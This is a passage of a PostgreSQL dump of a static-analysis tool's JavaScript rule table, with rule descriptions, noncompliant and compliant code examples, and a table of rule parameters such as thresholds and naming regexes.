doTheThing();\nelse if (a >= 10 && a < 20) {\n  doTheOtherThing();\n}\nelse if (a >= 20 && a < 50) {\n  doTheThirdThing();\n}\nelse {\n  doTheRest();\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453807492	1511453807493	2
880	"import" should be used to include external code	S3533	\N	javascript	<p>Before ECMAScript 2015, module management had to be ad-hoc or provided by 3rd-party libraries such as Node.js, Webpack, or RequireJS. Fortunately, ES2015, provides language-standard mechanisms for module management, <code>import</code> and <code>export</code>, and older usages should be converted.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n// circle.js\nexports.area = function (r) {\n  return PI * r * r;\n};\n\n// foo.js\ndefine(["./cart", "./horse"], function(cart, horse) {  // Noncompliant\n  // ...\n});\n\n// bar.js\nconst circle = require('./circle.js');  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// circle.js\nlet area = function (r) {\n  return PI * r * r;\n}\nexport default area;\n\n// foo.js\nimport cart from "./cart.js";\nimport horse from "./horse.js";\n\n// bar.js\nimport circle from "./circle.js"\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention,es2015,obsolete	f	HTML	1511453807494	1511453807494	1
881	"arguments.caller" and "arguments.callee" should not be used	S2685	\N	javascript	<p>Both <code>arguments.caller</code> and <code>arguments.callee</code> make quite a few optimizations impossible so they were deprecated in latest versions of JavaScript. In fact, EcmaScript 5 forbids the use of both in <code>strict</code> mode, according to the docs:</p>\n<blockquote>Arguments objects for strict mode functions define non-configurable accessor properties named "caller" and "callee" which throw a TypeError exception on access.</blockquote>\n<p>The same restriction applies to the function's <code>caller</code> and <code>arguments</code> properties in <code>strict</code> mode.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfunction whoCalled() {\n   if (arguments.caller == null)   //Noncompliant\n      console.log('I was called from the global scope.');\n   else\n      console.log(arguments.caller + ' called me!');  // Noncompliant\n\n  console.log(whoCalled.caller);  // Noncompliant\n  console.log(whoCalled.arguments);  // Noncompliant\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	obsolete	f	HTML	1511453807494	1511453807495	1
883	"NaN" should not be used in comparisons	S2688	\N	javascript	<p>\n  <code>NaN</code> is not equal to anything, even itself. Testing for equality or inequality against <code>NaN</code> will yield predictable results, but probably not the ones you want.\n</p>\n<p>\n  Instead, the best way to see whether a variable is equal to <code>NaN</code> is (perhaps counter-intuitively) to compare it to itself. Since <code>NaN !== NaN</code>, when <code>a !== a</code>, you know it must equal <code>NaN</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar a = NaN;\n\nif (a === NaN) {  // Noncompliant; always false\n  console.log("a is not a number");  // this is dead code\n}\nif (a !== NaN) { // Noncompliant; always true\n  console.log("a is not NaN"); // this statement is not necessarily true\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (a !== a) {\n  console.log("a is not a number");\n}\nif (a === a) {\n  console.log("a is not NaN");\n}\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807496	1511453807496	2
884	"for" loop incrementers should modify the variable being tested in the loop's stop condition	S1994	\N	javascript	<p>It is almost always an error when a <code>for</code> loop's stop condition and incrementer don't act on the same variable. Even when it is not, it could confuse future maintainers of the code, and should be avoided.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (i = 0; i &lt; 10; j++) {  // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfor (i = 0; i &lt; 10; i++) {\n  // ...\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453807498	1511453807498	2
885	Comma operator should not be used	S878	\N	javascript	<p>The comma operator takes two expressions, executes them from left to right and returns the result of the second one. Use of this operator is generally detrimental to the readability and reliability of code, and the same effect can be achieved by other means.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\ni = a += 2, a + b;  // What's the value of i ?\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\na +=  2;\ni = a + b;\n</pre>\n<h2>Exceptions</h2>\n\n<p>Use of comma operator is tolerated in initialization and increment expressions of <code>for</code> loops.</p>\n<pre>\nfor(i = 0, j = 5; i &lt; 6; i++, j++) { ... }\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 12.10 - The comma operator shall not be used.</li>\n<li> MISRA C++:2008, 5-18-1 - The comma operator shall not be used.</li>\n<li> MISRA C:2012, 12.3 - The comma operator should not be used</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra	f	HTML	1511453807499	1511453807499	1
886	Function parameters with default values should be last	S1788	\N	javascript	<p>The ability to define default values for function parameters can make a function easier to use. Default parameter values allow callers to specify as many or as few arguments as they want while getting the same functionality and minimizing boilerplate, wrapper code.</p>\n<p>But all function parameters with default values should be declared after the function parameters without default values. Otherwise, it makes it impossible for callers to take advantage of defaults; they must re-specify the defaulted values or pass <code>undefined</code> in order to "get to" the non-default parameters.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction multiply(a = 1, b) {  // Noncompliant\n  return a*b;\n}\n\nvar x = multiply(42);  // returns NaN as b is undefined\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction multiply(b, a = 1) {\n  return a*b;\n}\n\nvar x = multiply(42);  // returns 42 as expected\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	es2015	f	HTML	1511453807499	1511453807500	2
887	"strict" mode should be used with caution	StrictMode	\N	javascript	<p>\n  Even thought it may be a good practice to enforce JavaScript strict mode, doing so could result in unexpected behaviors on browsers that do not support it yet. Using this feature should therefore be done with caution and with full knowledge of the potential consequences on browsers that do not support it.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfunction strict() {\n  'use strict';\n}\n</pre>	0	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cross-browser,user-experience	f	HTML	1511453807500	1511453807500	1
888	Property names should not be duplicated within an object literal	DuplicatePropertyName	\N	javascript	<p>\n  JavaScript allows duplicate property names in object literals, but only the last instance of a duplicated property determines the actual value that will be used for it. Therefore, changing values of other occurrences of a duplicated property will have no effect and may cause misunderstandings and bugs.\n</p>\n\n<p>\n  What's more, using duplicate property names will generate an error in JavaScript strict mode code.\n  The following code snippet illustrates this rule :\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar data = {\n  "key": "value",\n  "1": "value",\n  "key": "value", // Noncompliant - duplicate of "key"\n  'key': "value", // Noncompliant - duplicate of "key"\n  key: "value", // Noncompliant - duplicate of "key"\n  \\u006bey: "value", // Noncompliant - duplicate of "key"\n  "\\u006bey": "value", // Noncompliant - duplicate of "key"\n  "\\x6bey": "value", // Noncompliant - duplicate of "key"\n  1: "value" // Noncompliant - duplicate of "1"\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar data = {\n  "key": "value",\n  "1": "value",\n  "key2": "value",\n  'key3': "value",\n  key4: "value",\n  \\u006bey5: "value",\n  "\\u006bey6": "value",\n  "\\x6bey7": "value",\n  1b: "value"\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807501	1511453807502	2
889	"new" operators should be used with functions	S2999	\N	javascript	<p>\n  The <code>new</code> keyword should only be used with objects that define a constructor function. Use it with anything else, and you'll get a <code>TypeError</code> because there won't be a constructor function for the <code>new</code> keyword to invoke.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction MyClass() {\n  this.foo = 'bar';\n}\n\nvar someClass = 1;\n\nvar obj1 = new someClass;    // Noncompliant;\nvar obj2 = new MyClass();    // Noncompliant if considerJSDoc parameter set to true. Compliant when considerJSDoc=false\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n/**\n * @constructor\n */\nfunction MyClass() {\n  this.foo = 'bar';\n}\n\nvar someClass = function(){\n  this.prop = 1;\n}\n\nvar obj1 = new someClass;  // Compliant\nvar obj2 = new MyClass();  // Compliant regardless of considerJSDoc value\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453807502	1511453807503	2
890	The global "this" object should not be used	S2990	\N	javascript	<p>\n  When the keyword <code>this</code> is used outside of an object, it refers to the global <code>this</code> object,\n  which is the same thing as the <code>window</code> object in a standard web page. Clearly, such a misdirected usage\n  could have unintended consequences, as well as being confusing to maintainers. Instead, simply drop the <code>this</code>;\n  it will have the same effect.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nthis.foo = 1;   // Noncompliant\nconsole.log(this.foo); // Noncompliant\n\nfunction MyObj() {\n  this.foo = 1; // Compliant\n}\n\nMyObj.func1 = function() {\n  if (this.foo == 1) { // Compliant\n    // ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nfoo = 1;\nconsole.log(foo);\n\nfunction MyObj() {\n  this.foo = 1;\n}\n\nMyObj.func1 = function() {\n  if (this.foo == 1) {\n    // ...\n  }\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807504	1511453807504	1
891	Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression	S881	\N	javascript	<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>\n<ul>\n  <li> It can significantly impair the readability of the code.\n  </li><li> It introduces additional side effects into a statement, with the potential for undefined behavior.\n</li><li> It is safer to use these operators in isolation from any other arithmetic operators.\n</li></ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nu8a = ++u8b + u8c--;\nfoo = bar++ / 4;\n</pre>\n\n<h2>Compliant Solution</h2>\n<p>The following sequence is clearer and therefore safer:</p>\n<pre>\n++u8b;\nu8a = u8b + u8c;\nu8c--;\nfoo = bar / 4;\nbar++;\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on the C operator precedence rules in expressions.\n  </li><li> MISRA C:2004, 12.13 - The increment (++) and decrement (--) operators should not be mixed with other operators in an expression.\n</li><li> MISRA C++:2008, 5-2-10 - The increment (++) and decrement (--) operator should not be mixed with other operators in an expression.\n</li><li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit\n</li><li> MISRA C:2012, 13.3 - A full expression containing an increment (++) or decrement (--) operator should have no other potential side effects other than that cause by the increment or decrement operator\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C</a> -      Do not depend on the order of evaluation for side effects\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP30-CPP</a> - Do not depend on order of evaluation between sequence points\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J</a> - Do not follow a write by a subsequent write or read of the same object within an expression\n</li></ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,misra	f	HTML	1511453807505	1511453807505	1
892	A "while" loop should be used instead of a "for" loop	S1264	\N	javascript	<p>When only the condition expression is defined in a <code>for</code> loop, but the init and increment expressions are missing, a <code>while</code> loop should be used instead to increase readability. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (;condition;) { /*...*/ }\n</pre>\n\n\n<h2>Compliant Solution</h2>\n<pre>\nwhile (condition) { /*...*/ }\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807506	1511453807506	1
893	"delete" should not be used on arrays	S2870	\N	javascript	<p>\n  The <code>delete</code> operator can be used to remove a property from any object. Arrays are objects, so the <code>delete</code> operator can be used here too,\n  but if it is, a hole will be left in the array because the indexes/keys won't be shifted to reflect the deletion.\n</p>\n\n<p>The proper method for removing an element at a certain index would be:</p>\n\n<ul>\n  <li><code>Array.prototype.splice</code> - add/remove elements from the the array</li>\n  <li><code>Array.prototype.pop</code> - add/remove elements from the end of the array</li>\n  <li><code>Array.prototype.shift</code> - add/remove elements from the beginning of the array</li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar myArray = ['a', 'b', 'c', 'd'];\n\ndelete myArray[2];  // Noncompliant. myArray => ['a', 'b', undefined, 'd']\nconsole.log(myArray[2]); // expected value was 'd' but output is undefined\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nvar myArray = ['a', 'b', 'c', 'd'];\n\n// removes 1 element from index 2\nremoved = myArray.splice(2, 1);  // myArray => ['a', 'b', 'd']\nconsole.log(myArray[2]); // outputs 'd'\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807507	1511453807507	2
894	Useless "if(true) {...}" and "if(false){...}" blocks should be removed	S1145	\N	javascript	<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code> statements with conditions that are always true are completely redundant, and make the code less readable.</p>\n<p>There are three possible causes for the presence of such code: </p>\n<ul>\n<li> An if statement was changed during debugging and that debug code has been committed.</li>\n<li> Some value was left unset.</li>\n<li> Some logic is not doing what the programmer thought it did.</li>\n</ul>\n<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (true) {  // Noncompliant\n  doSomething();\n}\n...\nif (false) {  // Noncompliant\n  doSomethingElse();\n}\n\nif (!options || options === true) { doThirdThing(); }  // Noncompliant; always true\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ndoSomething();\n\ndoThirdThing();\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True</li>\n<li> MISRA C:2004, 13.7</li>\n<li> MISRA C:2012, 14.3</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cwe,misra	f	HTML	1511453807508	1511453807508	2
895	Parameters should be passed in the correct order	S2234	\N	javascript	<p>When the names of arguments in a function call match the names of the function parameters, it contributes to clearer, more readable code. However, when the names match, but are passed in a different order than the function parameters, it indicates a mistake in the parameter order which will likely lead to unexpected results.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction divide(var divisor, var dividend) {\n  return divisor/dividend;\n}\n\nfunction doTheThing() {\n  var divisor = 15;\n  var dividend = 5;\n\n  var result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction divide(var divisor, var dividend) {\n  return divisor/dividend;\n}\n\npublic void doTheThing() {\n  var divisor = 15;\n  var dividend = 5;\n\n  var result = divide(divisor, dividend);\n  //...\n}\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807508	1511453807509	2
896	Useless parentheses around expressions should be removed to prevent any misunderstanding	Parentheses	\N	javascript	<p>Useless parentheses can sometimes be misleading and so should be removed. </p>\n<p>The following code snippet illustrates this rule:</p>\n<pre>\nreturn 3;             // Compliant\nreturn (x);           // Non-Compliant\nreturn (x + 1);       // Non-Compliant\nint x = (y / 2 + 1);  // Non-Compliant\nint y = (4+X) * y;    // Compliant\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	confusing	f	HTML	1511453807509	1511453807510	1
897	"switch" statements should have at least 3 "case" clauses	S1301	\N	javascript	<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>\n<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nswitch (variable) {\n  case 0:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (variable == 0) {\n  doSomething();\n} else {\n  doSomethingElse();\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause.</li>\n<li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause.</li>\n<li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses</li>\n</ul>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra	f	HTML	1511453807510	1511453807510	1
898	Files should not have too many lines	S104	\N	javascript	<p>\n  A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.</br>\n  Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks.</br>\n  Those smaller files will not only be easier to understand but also probably easier to test.\n</p>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	brain-overload	f	HTML	1511453807511	1511453807511	1
899	Local storage should not be used	S3271	\N	javascript	<p>Session storage and local storage are HTML 5 features which allow developers to easily store megabytes of data client-side, as opposed to the 4Kb cookies can accommodate. While useful to speed applications up on the client side, it can be dangerous to store sensitive information this way because the data is not encrypted by default and any script on the page may access it.</p>\n<p>This rule raises an issue when the <code>localStorage</code> and <code>sessionStorage</code> API's are used.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nlocalStorage.setItem("login", login); // Noncompliant\nsessionStorage.setItem("sessionId", sessionId); // Noncompliant\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://dl.packetstormsecurity.net/papers/attack/HTML5AttackVectors_RafayBaloch_UPDATED.pdf">Packet Storm Security</a> - HTML 5 Modern Day Attack And Defence Vectors\n</li><li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure\n</li></ul>	3	\N	READY	js	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	5min	\N	1h	per additional use of the api	\N	owasp-a6	f	HTML	1511453807512	1511453807513	3
900	Non-empty statements should have at least one side-effect	S905	\N	javascript	<p>An expression statement without side effects, such as a comparison without assigning its result to a variable, is useless, and must have been a mistake on the developer's part.</p>\n\n<h2>Noncompliant code example</h2>\n\n<pre>\nvar str = "long string split on multiple lines but" // without concatenation operator, statement implicitly ends at the linebreak\n  " the concatenation operator + is missing";  // Noncompliant\n\na == 1;   // Noncompliant; was assignment intended?\n</pre>\n\n<h2>See</h2>\n<ul><li><a href="http://cwe.mitre.org/data/definitions/482">MITRE, CWE-482</a> - Comparing instead of Assigning</li></ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,unused	f	HTML	1511453807514	1511453807514	2
901	Console logging should not be used	S2228	\N	javascript	<p>\n  Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you run the risk of inadvertently exposing sensitive information, slowing down the browser, or even erroring-out the site for some users. (Not all browsers support <code>console.log()</code>).\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nconsole.log(password_entered); // Noncompliant\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure </li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	owasp-a6	f	HTML	1511453807515	1511453807515	3
902	Class names and file names should match	S3317	\N	javascript	<p>By convention, a file that exports only one class should be named for that class. Anything else may confuse maintainers.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n// file path: myclass.js  -- Noncompliant\nclass MyClass {\n  // ...\n}\nexport default MyClass;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// file path: MyClass.js\nclass MyClass {\n  // ...\n}\nexport default MyClass;\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing,es2015	f	HTML	1511453807515	1511453807515	1
903	Loops should not contain more than a single "break" or "continue" statement	TooManyBreakOrContinueInLoop	\N	javascript	<p>\n  Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.\n</p>\n\n<p>\n  One <code>break</code> and <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more than one, the code should be refactored to increase readability.\n</p>\n\n<h2>Noncompiant Code Example</h2>\n<pre>\nfor (var i = 1; i <= 10; i++) {  // Noncompliant - 2 continue - one might be tempted to add some logic in between\n  if (i % 2 == 0) {\n    continue;\n  }\n\n  if (i % 3 == 0) {\n    continue;\n  }\n\n  alert("i = " + i);\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR	\N	20min	\N	\N	per extra "break" or "continue" statement	\N	brain-overload	f	HTML	1511453807516	1511453807516	1
907	Variables should be declared before they are used	VariableDeclarationAfterUsage	\N	javascript	<p>One of the biggest sources of confusion for JavaScript beginners is scoping. The reason scoping is so confusing in JavaScript is because JavaScript looks like a C-family language but doesn't act like one. C-family languages have block-level scope, meaning that when control enters a block, such as an <code>if</code> statement, new variables can be declared within that scope without affecting the outer scope. However, this is not the case in JavaScript.</p>\n<p>To minimize confusion as much as possible, variables should always be declared before they are used.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar x = 1;\n\nfunction fun(){\n  alert(x); // Noncompliant as x is declared later in the same scope\n  if(something) {\n    var x = 42; // Declaration in function scope (not block scope!) shadows global variable\n  }\n}\n\nfun(); // Unexpectedly alerts "undefined" instead of "1"\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nvar x = 1;\n\nfunction fun() {\n  print(x);\n  if (something) {\n    x = 42;\n  }\n}\n\nfun(); // Print "1"\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453807520	1511453807520	1
908	"eval" and "arguments" should not be bound or assigned	BoundOrAssignedEvalOrArguments	\N	javascript	<p>In JavaScript, <code>eval</code> is used to evaluate a string as JavaScript code, and <code>arguments</code> is used to access function arguments through indexed properties.\n  As a consequence, <code>eval</code> and <code>arguments</code> should not be bound or assigned, because doing so would overwrite the original definitions of those two reserved words. </p>\n\n<p>What's more, using either of those two names to assign or bind will generate an error in JavaScript strict mode code.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\neval = 17; // Noncompliant\narguments++; // Noncompliant\n++eval; // Noncompliant\nvar obj = { set p(arguments) { } }; // Noncompliant\nvar eval; // Noncompliant\ntry { } catch (arguments) { } // Noncompliant\nfunction x(eval) { } // Noncompliant\nfunction arguments() { } // Noncompliant\nvar y = function eval() { }; // Noncompliant\nvar f = new Function("arguments", "return 17;"); // Noncompliant\n\nfunction fun() {\n  if (arguments.length == 0) { // Compliant\n    // do something\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nresult = 17;\nargs++;\n++result;\nvar obj = { set p(arg) { } };\nvar result;\ntry { } catch (args) { }\nfunction x(arg) { }\nfunction args() { } \nvar y = function fun() { }; \nvar f = new Function("args", "return 17;");\n\nfunction fun() {\n  if (arguments.length == 0) {\n    // do something\n  }\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453807521	1511453807521	2
909	Internet Explorer's conditional comments should not be used	ConditionalComment	\N	javascript	<p>\n  Internet Explorer offers a way to change the JavaScript code at runtime using conditional comments (activated by a @cc_on statement found in a comment). Using this preprocessing feature decreases readability and maintainability, and can hinder automated tools. What's more, it is specific to Internet Explorer and won't work for other browsers.\n</p>\n\n</p>\n  Most of the time, using those conditional comments can be easily avoided with some refactoring - using modern cross-browsers JavaScript frameworks and libraries.\n  The following code snippet illustrates the use of conditional comments:\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n/*@cc_on\n  @if (@_jscript_version >= 5.5)\n    document.write("You are using IE5.5 or newer");\n  @else\n    document.write("You are using IE5 or older");\n  @end\n  @*/\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cross-browser	f	HTML	1511453807522	1511453807522	1
910	The names of model properties should not contains spaces	S2508	\N	javascript	<p>\n  When using the Backbone.js framework, the names of model attributes should not contain spaces. This is because the Events object accepts space-delimited lists of events, so an attributes with spaces in the names could be misinterpreted.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nPerson = Backbone.Model.extend({\n        defaults: {\n            'first name': 'Bob',      // Noncompliant\n            'birth date': new Date()  // Noncompliant\n        },\n    });\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nPerson = Backbone.Model.extend({\n        defaults: {\n            firstName: 'Bob',\n            birthDate: new Date()\n        },\n    });\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	backbone	f	HTML	1511453807522	1511453807522	2
\.


--
-- TOC entry 2631 (class 0 OID 32830)
-- Dependencies: 197
-- Data for Name: rules_parameters; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY rules_parameters (id, rule_id, name, description, param_type, default_value) FROM stdin;
1	1	minimumBranchCoverageRatio	\N	FLOAT	65
2	2	minimumLineCoverageRatio	\N	FLOAT	65
3	3	minimumCommentDensity	\N	FLOAT	25
4	7	minimumBranchCoverageRatio	\N	FLOAT	65
5	8	minimumLineCoverageRatio	\N	FLOAT	65
6	9	minimumCommentDensity	\N	FLOAT	25
7	34	max	Maximum allowed control flow statement nesting depth	INTEGER	3
8	60	max	Maximum number of allowed conditional operators in an expression	INTEGER	3
9	94	format	Regular expression used to check the method names against	STRING	^[A-Z][a-zA-Z0-9_]*[a-zA-Z0-9]$
10	96	format	Regular expression used to check the class names against.	STRING	^([A-HJ-Z][a-zA-Z0-9]+|I[a-z0-9][a-zA-Z0-9]*|[A-Z][a-zA-Z0-9]+Extensions)$
11	109	maximum	Maximum number of case	INTEGER	30
12	136	maximumFunctionComplexityThreshold	The maximum authorized complexity in function	INTEGER	10
13	148	max	Maximum authorized number of parameters	INTEGER	7
14	149	maximumFileLocThreshold	Maximum authorized lines in a file.	INTEGER	1000
15	151	maximumLineLength	The maximum authorized line length.	INTEGER	200
16	271	CheckId	\N	STRING	\N
17	406	countNonpublicMethods	Whether or not to include non-public methods in the count.	BOOLEAN	true
18	406	maximumMethodThreshold	The maximum number of methods authorized in a class.	INTEGER	35
19	410	indentationLevel	Number of white-spaces of an indent. If this property is not set, we just check that the code is indented.	INTEGER	2
20	411	max	Maximum number of classes a single class is allowed to depend upon	INTEGER	20
21	419	max	Maximum depth of the inheritance tree. (Number)	INTEGER	5
22	427	format	Regular expression used to check the logger names against.	STRING	LOG(?:GER)?
23	430	fromClasses	Optional. If this property is not defined, all classes should adhere to this constraint. Ex : **.web.**	STRING	\N
24	430	toClasses	Mandatory. Ex : java.util.Vector, java.util.Hashtable, java.util.Enumeration	STRING	\N
25	445	legalTrailingCommentPattern	Description Pattern for text of trailing comments that are allowed. By default, comments containing only one word.	STRING	^\\s*+[^\\s]++$
26	450	headerFormat	Expected copyright and license header	TEXT	\N
27	450	isRegularExpression	Whether the headerFormat is a regular expression	BOOLEAN	false
28	481	Max	The maximum number of lines allowed	INTEGER	25
29	489	Exclude	Comma separated list of Sun packages to be ignored by this rule. Example: com.sun.jna,sun.misc	STRING	\N
30	490	threshold	Number of times a literal must be duplicated to trigger an issue	INTEGER	3
31	494	threshold	Maximum allowed number of ``<forward/>`` mappings in an ``<action>``	INTEGER	4
32	518	listOfWarnings	Comma separated list of warnings that can be suppressed (example: unchecked, cast, boxing). An empty list means that no warning can be suppressed.	STRING	\N
33	525	Authorized numbers	Comma separated list of authorized numbers. Example: -1,0,1,2	STRING	-1,0,1
34	551	max	Maximum authorized lines in a method	INTEGER	100
35	573	methodName	Name of the forbidden method	STRING	\N
36	573	className	Name of the class whose method is forbidden	STRING	\N
37	573	argumentTypes	Comma-delimited list of argument types, E.G. java.lang.String, int[], int	STRING	\N
38	573	allOverloads	Set to true to flag all overloads regardless of parameter type	BOOLEAN	false
39	578	exceptions	List of exceptions which should not be checked	STRING	java.lang.InterruptedException, java.lang.NumberFormatException, java.text.ParseException, java.net.MalformedURLException
40	587	format	Regular expression used to check the class names against.	STRING	^[A-Z][a-zA-Z0-9]*$
41	589	format	Regular expression used to check the method names against.	STRING	^[a-z][a-zA-Z0-9]*$
42	590	Threshold	The maximum authorized complexity.	INTEGER	10
43	592	regularExpression	The regular expression	STRING	\N
44	592	message	The issue message	STRING	The regular expression matches this comment.
45	593	max	Maximum number of lines	INTEGER	5
